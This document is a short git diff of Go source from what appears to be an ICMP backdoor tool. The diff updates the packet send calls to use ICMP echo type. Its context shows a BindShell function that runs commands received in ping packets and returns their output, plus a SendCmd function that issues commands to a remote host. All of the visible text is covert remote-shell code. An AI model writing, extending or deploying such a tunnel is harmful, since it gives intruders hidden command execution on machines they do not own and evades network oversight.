@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"net"
+
+	"golang.org/x/net/ipv4"
 )
 
 type CLI struct {
@@ -24,7 +26,7 @@ func (cli *CLI) BindShell() {
 		if msg.kind == msgCmdType {
 			fmt.Println(msg.value)
 			msg := newMsgResType(runCmd(msg.value))
-			cli.icmp.Send(msg.bytes, peer.String())
+			cli.icmp.Send(ipv4.ICMPTypeEcho, msg.bytes, peer.String())
 		}
 	})
 	cli.icmp.Listen()
@@ -32,7 +34,7 @@ func (cli *CLI) BindShell() {
 
 // Execute a command on the remote host
 func (cli *CLI) SendCmd(cmd, host string) {
-	cli.icmp.Send(newMsgCmdType(cmd).bytes, host)
+	cli.icmp.Send(ipv4.ICMPTypeEcho, newMsgCmdType(cmd).bytes, host)
 	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
 		msg := parseMsg(res)
 		if msg.kind == msgResType {
